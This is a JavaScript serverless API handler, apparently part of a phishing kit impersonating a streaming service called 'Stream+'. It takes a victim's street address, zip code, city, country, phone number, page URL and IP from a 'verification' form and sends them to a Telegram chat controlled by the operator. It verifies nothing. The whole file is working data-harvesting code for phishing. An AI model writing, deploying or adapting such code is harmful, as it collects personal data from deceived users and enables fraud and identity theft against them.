// POST /api/send-address — address verification data
const { clientIp, sendTelegram, cors } = require('./_telegram');

module.exports = async (req, res) => {
    cors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    try {
        const {
            street,
            address,
            apartment,
            zip,
            zip_code,
            city,
            country,
            phone,
            phoneNumber,
            ip,
            pageUrl,
            timestamp
        } = req.body;

        const streetVal = (street || address || '').toString().trim();
        const zipVal = (zip || zip_code || '').toString().trim();
        const cityVal = (city || '').toString().trim();
        const countryVal = (country || '').toString().trim();
        const phoneVal = (phone || phoneNumber || '').toString().trim();

        if (!streetVal || !zipVal || !cityVal || !countryVal || !phoneVal) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields (street, zip, city, country, phone)'
            });
        }

        const message =
`📍 [Stream+ Address]

- Address : <code>${streetVal}</code>
- Apartment : <code>${(apartment || '-').toString().trim() || '-'}</code>
- Zip : <code>${zipVal}</code>
- City : <code>${cityVal}</code>
- Country : <code>${countryVal}</code>
- Phone : <code>${phoneVal}</code>
- Page URL : ${pageUrl || 'N/A'}
- IP : ${ip || clientIp(req)}
- Time : ${timestamp || new Date().toISOString()}

<blockquote>└ © Stream+ Server</blockquote>`;

        const result = await sendTelegram(message);

        return res.status(200).json({
            success: true,
            message: 'Address data sent successfully',
            messageId: result.message_id,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('[send-address]', error.message);
        return res.status(500).json({
            success: false,
            message: 'Failed to send address data',
            error: error.message
        });
    }
};
